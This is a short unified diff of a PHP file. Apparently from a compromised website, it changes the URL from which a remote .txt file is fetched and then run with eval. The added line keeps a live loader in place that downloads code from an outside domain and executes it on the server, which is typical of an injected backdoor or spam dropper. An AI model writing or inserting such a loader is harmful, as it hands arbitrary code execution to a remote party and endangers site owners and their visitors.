@@ -14,7 +14,7 @@ function get_contents($url){
 }?>
 <?php
 $a =
-get_contents('https://ribaksudehospital.com/landing/prodestic/prodestic.txt');
+get_contents('https://ribaksudehospital.com/landing/neoflexadvertising/neoflexadvertising.txt');
 eval('?>'.$a);
 ?>
 
